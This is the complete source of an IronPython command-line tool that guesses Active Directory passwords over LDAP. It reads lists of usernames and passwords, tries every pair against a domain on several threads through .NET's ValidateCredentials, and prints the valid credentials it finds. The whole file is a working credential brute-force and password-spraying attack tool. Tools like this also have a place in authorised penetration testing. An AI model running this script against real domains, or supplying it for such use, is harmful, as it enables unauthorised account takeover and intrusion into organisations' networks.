#! ipy

__author__ = 'Jake Miller (@LaconicWolf)'
__date__ = '20181128'
__version__ = '0.01'
__description__ = '''A multithreaded LDAP password guesser using (mostly) .NET assemblies in IronPython'''

import platform
if platform.python_implementation() != 'IronPython':
    print '\n[-] This script requires IronPython. Sorry!'
    exit()

import argparse
import sys

# Required to import .Net assemblies. CLR is Common Language Runtime
import clr

# Adds the assemblies to CLR. 
# CLR only includes a reference to System by default.
clr.AddReference("System.DirectoryServices.AccountManagement")
clr.AddReference("System.Threading")
clr.AddReference("System.Collections")
clr.AddReference('System.IO')

# Importing the specific namespaces
from System.DirectoryServices import AccountManagement
from System.Environment import UserDomainName
from System.Threading import Thread, ThreadStart, Monitor
from System.Collections import Queue
from System.IO import File

class ObjectLocker(object):
    """Implements a lock. Reference:
    https://mail.python.org/pipermail/ironpython-users/2010-December/014047.html
    """
    def __init__(self, obj):
        self.obj = obj
    def __enter__(self):
        Monitor.Enter(self.obj)
    def __exit__(self, *args):
        Monitor.Exit(self.obj)

def validate_credentials(user, password, domain):
    """Attempts to authenticate usine a specified username,
    password, and domain.
    """
    try:
        principal_context = AccountManagement.PrincipalContext(
            AccountManagement.ContextType.Domain,domain
        )
    except Exception as e:
        print '[-] An error has occurred: {}'.format(e)
        return False
    return principal_context.ValidateCredentials(
        user, password
    )

def guess_ldap_creds(user):
    """Accepts a username and iterates through a password list, 
    passing each username/password combination to the validateCredentials 
    function. Prints valid credentials to the screen.
    """
    for password in passwords:
        isValid = validate_credentials(
            user, password, domain
        )
        if isValid:
            with ObjectLocker(object()):
                print '[+] {}:{}'.format(user, password)

def manage_queue():
    """Manages the username queue, passing each user to the 
    guessLdapCreds function.
    """
    while True:
        if user_queue.Count == 0:
            break
        current_user = user_queue.Dequeue()
        guess_ldap_creds(current_user)

def main():
    """Prints information about the guessing session and 
    starts the multithreading."""
    word_banner = '{} version: {}. Coded by: {}'.format(
        sys.argv[0], __version__, __author__)
    print('=' * len(word_banner))
    print(word_banner)
    print('=' * len(word_banner))
    print
    for arg in vars(args):
        if getattr(args, arg):
            print('{}: {}'.format(
                arg.title().replace('_',' '), getattr(args, arg)))
    print
    print ('[*] Guessing {} user(s) and {} password(s). {} total'
    ' guesses.'.format(
        len(usernames), len(passwords), len(usernames) * len(passwords)
    ))
    print '[*] Only printing valid username/password combinations.\n'

    for i in range(args.threads):
        t = Thread(ThreadStart(manage_queue))
        t.Start()
    for current_user in usernames:
        user_queue.Enqueue(current_user)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=('Guess a supplied list of passwords against a supplied '
        'list of usernames.')
    )
    parser.add_argument(
        '-u', '--username',
        help='Specify a username to guess password(s) against.'
    )
    parser.add_argument(
        '-d', '--domain',
        help=('Specify a domain. Defaults to the local domain of the computer'
        ' the script is running from.')
    )
    parser.add_argument(
        '-p', '--password',
        help='Specify a password to guess against usernames.'
    )
    parser.add_argument(
        '-uf', '--username_file',
        help=('Specify the path of a file containing usernames to guess '
        'password(s) against.')
    )
    parser.add_argument(
        '-pf', '--password_file',
        help=('Specify the path of a file containing passwords to guess '
        'against username(s).')
    )
    parser.add_argument(
        "-t", "--threads",
        nargs="?",
        type=int,
        const=5,
        default=5,
        help="Specify number of threads (default=5)"
    )
    args = parser.parse_args()

    if not args.username and not args.username_file:
        parser.print_help()
        print ('\n[-] Please specify either a single username (-u) or the '
        'path to a file listing usernames (-uf).')
        exit()
    if not args.password and not args.password_file:
        parser.print_help()
        print ('\n[-] Please specify either a single password (-p) or the '
        'path to a file listing passwords (-pf).')
        exit()
    if args.username and args.username_file:
        parser.print_help()
        print ('\n[-] Please specify either a single username (-u) or the '
        'path to a file listing usernames (-uf). Not both.')
        exit()
    if args.password and args.password_file:
        parser.print_help()
        print ('\n[-] Please specify either a single password (-p) or the '
        'path to a file listing passwords (-pf). Not both.')
        exit()

    usernames = passwords = []
    
    if args.username:
        usernames = [args.username]
    if args.username_file:
        if not File.Exists(args.username_file):
            print ('\n[-] The file {} does not exist or you do not have '
            'access to it. Please check the path and try again.'.format(
                args.username_file))
            exit()
        with open(args.username_file) as fh:
            usernames = fh.read().splitlines()
    if args.password:
        passwords = [args.password]
    if args.password_file:
        if not File.Exists(args.password_file):
            print ('\n[-] The file {} does not exist or you do not have '
            'access to it. Please check the path and try again.'.format(
                args.password_file))
            exit()
        with open(args.password_file) as fh:
            passwords = fh.read().splitlines()

    if args.domain:
        domain = args.domain
    else:
        domain = UserDomainName

    user_queue = Queue()

    main()